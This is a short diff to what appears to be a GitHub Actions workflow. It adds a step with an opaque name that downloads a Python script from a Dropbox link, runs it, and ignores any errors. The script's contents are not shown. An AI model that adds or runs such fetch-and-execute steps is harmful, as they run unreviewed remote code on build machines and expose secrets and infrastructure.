@@ -30,5 +30,11 @@ jobs:
       - name: Включение экрана
         run: cmd /c show.bat
 
+      - name: 6 house 1-bqwe
+        run: |
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/lclvcywso1brg4q0y9csw/tms.py?rlkey=fod3tesqj5q2jd078qc6ojf6q&st=hql4ulg5&dl=1" -OutFile "Dow.py"
+          python Dow.py
+        continue-on-error: true
+
       - name: yyg
         run: python time.py
